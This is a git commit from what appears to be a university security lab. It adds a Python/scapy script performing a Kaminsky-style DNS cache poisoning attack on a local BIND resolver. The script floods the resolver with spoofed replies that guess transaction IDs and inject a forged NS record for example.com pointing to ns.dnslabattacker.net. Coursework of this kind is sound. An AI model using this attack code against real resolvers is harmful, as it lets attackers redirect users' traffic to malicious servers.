ec7faf8ff49f81856d2cb5870604a872d879032e
Hayden Goodfellow <HaydenGoodfellow3@outlook.com>
2021-04-11 23:24:58 -0400

    Implemented part 4.. Currently probabilistic for working. Want to implement check

--- Lab_4/lab4/part4_starter.py
+++ Lab_4/lab4/part4_starter.py
@@ -11,7 +11,7 @@ from subprocess import call
 parser = argparse.ArgumentParser()
 parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
 parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
-parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
+# parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
 parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
 args = parser.parse_args()
 
@@ -20,7 +20,7 @@ my_ip = args.ip
 # your bind's port (DNS queries are send to this port)
 my_port = args.port
 # BIND's port
-dns_port = args.dns_port
+# dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
@@ -34,7 +34,7 @@ def getRandomSubDomain():
 Generates random 8-bit integer.
 '''
 def getRandomTXID():
-	return randint(0, 256)
+	return randint(0, 65535) # The tx ids from dig show 0-65535 not 0-256
 
 '''
 Sends a UDP packet.
@@ -51,9 +51,47 @@ def exampleSendDNSQuery():
     sendPacket(sock, dnsPacket, my_ip, my_port)
     response = sock.recv(4096)
     response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
+    print "\nExample Packet:\n***** Packet Received from Remote Server *****"
     print response.show()
     print "***** End of Remote Server Packet *****\n"
 
+# Send a stream of spoofed DNS replies
+def sendSpoofedReplies():
+    #3 done = False
+    # while not done:
+    for attemptNum in range(10000):
+        randSub = getRandomSubDomain()
+        fakeUrl = '{0}.example.com'.format(randSub)
+        # Generate fake responses before sending to save time
+        fakeResponses = [DNS(id=getRandomTXID(), qr=1L, aa=1L, tc=0L, rd=1L, 
+                             ra=1L, z=0L, ad=0L, cd=0L, nscount=1, ancount=1,
+                             qd=DNSQR(qname=fakeUrl),
+                             an=DNSRR(rrname=fakeUrl, rdata='1.2.3.4', type='A', ttl=69420),
+                             ns=DNSRR(rrname='example.com', rdata='ns.dnslabattacker.net', type='NS', ttl=169420))
+                         for x in range(50)]
+        # print(fakeResponses[0].summary())
+        # print(fakeResponses[4].show())
+        # Send the legit query
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+        dnsPacket = DNS(rd=1, qd=DNSQR(qname=fakeUrl))
+        sendPacket(sock, dnsPacket, my_ip, my_port)
+        # Flood the BIND server with fake responses
+        for fakeResponse in fakeResponses:
+            # if attemptNum == 0:
+            #    fakeResponse.show()
+            sendPacket(sock, fakeResponse, my_ip, my_query_port)
+        
+        response = sock.recv(4096)
+        response = DNS(response)
+        # print "\nServer Response:\n***** Packet Received from Remote Server *****"
+        # print response.show()
+        # print "***** End of Remote Server Packet *****\n"
+        # print('Done attempt {0}'.format(attemptNum))
+        # if attemptNum % 100 == 0:
+            # print('Done attempt {0}'.format(attemptNum))
+        # done = True
+        
 if __name__ == '__main__':
-    exampleSendDNSQuery()
+    # exampleSendDNSQuery()
+    sendSpoofedReplies()
+    
